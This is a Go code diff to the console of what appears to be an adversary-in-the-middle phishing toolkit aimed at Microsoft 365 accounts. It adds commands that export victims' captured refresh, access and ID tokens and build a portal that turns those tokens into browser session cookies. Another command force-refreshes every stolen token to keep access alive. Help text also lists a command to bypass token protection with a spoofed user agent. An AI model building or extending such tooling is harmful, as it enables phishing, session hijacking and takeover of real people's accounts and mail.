@@ -1806,6 +1806,77 @@ func (t *Terminal) handleSessions(args []string) error {
 				t.db.Flush()
 				return nil
 			}
+		default:
+			// Handle: sessions <id> <subcommand>
+			id, err := strconv.Atoi(args[0])
+			if err == nil {
+				switch args[1] {
+				case "portal":
+					// Generate a portal link for the session - exchanges tokens for cookies
+					portalToken, err := t.p.tokenPortal.GeneratePortalLink(id)
+					if err != nil {
+						return fmt.Errorf("portal: %v", err)
+					}
+
+					// Build the portal URL using the phishing domain
+					portalPath := "/p/" + portalToken
+					phishDomain := ""
+					for _, pl := range t.cfg.phishlets {
+						if t.cfg.IsSiteEnabled(pl.Name) {
+							if len(pl.proxyHosts) > 0 {
+								phishDomain = pl.proxyHosts[0].phish_subdomain + "." + t.cfg.general.Domain
+								break
+							}
+						}
+					}
+					if phishDomain == "" {
+						phishDomain = t.cfg.general.Domain
+					}
+
+					portalURL := "https://" + phishDomain + portalPath
+
+					t.output("")
+					t.output("  %s %s", white.Sprint("Portal URL:"), lgreen.Sprint(portalURL))
+					t.output("")
+					t.output("  %s Open this URL in your browser to access the portal page.", dgray.Sprint("→"))
+					t.output("  %s The portal extracts Microsoft session cookies from the captured tokens.", dgray.Sprint("→"))
+					t.output("  %s Import the cookies using StorageAce → navigate to any Microsoft 365 service.", dgray.Sprint("→"))
+					t.output("  %s This link expires in 30 minutes and is one-time use.", yellow.Sprint("⚠"))
+					t.output("")
+					return nil
+
+				case "export":
+					// Export raw tokens for a session
+					tokens, err := t.p.tokenPortal.ExportSessionTokens(id)
+					if err != nil {
+						return fmt.Errorf("export: %v", err)
+					}
+
+					t.output("")
+					t.output("  [ %s ]", white.Sprint("Session #"+args[0]+" - Exported Tokens"))
+					t.output("")
+
+					tkeys := []string{}
+					tvals := []string{}
+					for k, v := range tokens {
+						tkeys = append(tkeys, k)
+						if k == "dc_refresh_token" || k == "dc_access_token" || k == "dc_id_token" {
+							tvals = append(tvals, white.Sprint(v))
+						} else {
+							tvals = append(tvals, cyan.Sprint(v))
+						}
+					}
+					log.Printf("\n%s\n", AsRows(tkeys, tvals))
+
+					// Print usage hints
+					t.output("  %s Copy the refresh token and use with:", dgray.Sprint("→"))
+					t.output("    %s roadtx auth --refresh-token <token>", cyan.Sprint("•"))
+					t.output("    %s mailbox.html (paste in token field)", cyan.Sprint("•"))
+					t.output("    %s sessions %d portal (generate cookie import page)", cyan.Sprint("•"), id)
+					t.output("")
+					return nil
+				}
+			}
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -2721,12 +2792,74 @@ func (t *Terminal) handleDeviceCode(args []string) error {
 
 	case "refresh":
 		if pn == 2 {
+			if args[1] == "all" {
+				// Force refresh all tokens
+				if t.tokenAutoRefresh != nil {
+					log.Info("[autorefresh] Forcing refresh of all tokens...")
+					go func() {
+						sessions, err := t.db.ListSessions()
+						if err != nil {
+							log.Error("[autorefresh] Failed to list sessions: %v", err)
+							return
+						}
+						refreshed := 0
+						for _, s := range sessions {
+							if s.Custom != nil {
+								if rt, ok := s.Custom["dc_refresh_token"]; ok && rt != "" {
+									err := t.tokenAutoRefresh.RefreshSessionToken(s.SessionId)
+									if err != nil {
+										log.Warning("[autorefresh] [%d] %s: %v", s.Id, s.Username, err)
+									} else {
+										refreshed++
+									}
+								}
+							}
+						}
+						log.Success("[autorefresh] Refreshed %d tokens", refreshed)
+					}()
+				}
+				return nil
+			}
 			err := t.p.deviceCode.RefreshAccessToken(args[1])
 			if err != nil {
 				return err
 			}
 			return nil
 		}
+
+	case "status":
+		// Show auto-refresh status
+		if t.tokenAutoRefresh != nil {
+			total, withRefresh := t.tokenAutoRefresh.GetRefreshStats()
+			running := t.tokenAutoRefresh.IsRunning()
+			statusColor := hiyellow
+			statusText := "STOPPED"
+			if running {
+				statusColor = higreen
+				statusText = "RUNNING"
+			}
+			t.output("\n  %s Auto-Refresh Status\n", white.Sprint("🔄"))
+			t.output("  %-20s %s\n", "Status:", statusColor.Sprint(statusText))
+			t.output("  %-20s %d\n", "Total sessions:", total)
+			t.output("  %-20s %d\n", "With refresh token:", withRefresh)
+			t.output("  %-20s 15 minutes\n\n", "Refresh interval:")
+		}
+
+		// Show proxy connection stats
+		if t.p != nil {
+			stats := t.p.GetConnectionStats()
+			t.output("  %s Proxy Connection Stats\n", white.Sprint("📊"))
+			t.output("  %-20s %v\n", "Uptime:", stats.Uptime.Round(time.Second))
+			t.output("  %-20s %d\n", "Active connections:", stats.ActiveConns)
+			t.output("  %-20s %d\n", "Total connections:", stats.TotalConns)
+			t.output("  %-20s %d\n", "Failed connections:", stats.FailedConns)
+			if stats.TotalConns > 0 {
+				successRate := float64(stats.TotalConns-stats.FailedConns) / float64(stats.TotalConns) * 100
+				t.output("  %-20s %.1f%%\n", "Success rate:", successRate)
+			}
+			t.output("  %-20s %s\n\n", "Last connection:", stats.LastConnTime.Format("2006-01-02 15:04:05"))
+		}
+		return nil
 
 	case "bypass":
 		if pn == 2 {
@@ -2894,6 +3027,8 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
 	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
 	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
+	h.AddSubCommand("sessions", nil, "<id> portal", "generate a portal URL to extract Microsoft cookies from captured tokens (opens cookie import page)")
+	h.AddSubCommand("sessions", nil, "<id> export", "export all captured device code tokens for a session (refresh token, access token, etc.)")
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
 
@@ -3015,7 +3150,8 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("poll"),
 			readline.PcItem("tokens"),
 			readline.PcItem("userinfo"),
-			readline.PcItem("refresh"),
+			readline.PcItem("refresh", readline.PcItem("all")),
+			readline.PcItem("status"),
 			readline.PcItem("bypass"),
 			readline.PcItem("delete", readline.PcItem("all")),
 			readline.PcItem("clients"),
@@ -3028,7 +3164,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("devicecode", []string{"poll"}, "poll <session_id>", "start polling for tokens on an existing session")
 	h.AddSubCommand("devicecode", []string{"tokens"}, "tokens <session_id>", "export captured tokens as JSON")
 	h.AddSubCommand("devicecode", []string{"userinfo"}, "userinfo <session_id>", "fetch victim's profile from Microsoft Graph")
-	h.AddSubCommand("devicecode", []string{"refresh"}, "refresh <session_id>", "refresh an expired access token using the refresh token")
+	h.AddSubCommand("devicecode", []string{"refresh"}, "refresh <session_id|all>", "refresh access token(s) using refresh token(s)")
+	h.AddSubCommand("devicecode", []string{"status"}, "status", "show auto-refresh status and statistics")
 	h.AddSubCommand("devicecode", []string{"bypass"}, "bypass <session_id>", "refresh token with OS/2 Warp UA to bypass token protection")
 	h.AddSubCommand("devicecode", []string{"delete"}, "delete <session_id>", "delete a device code session")
 	h.AddSubCommand("devicecode", []string{"delete", "all"}, "delete all", "delete all device code sessions")
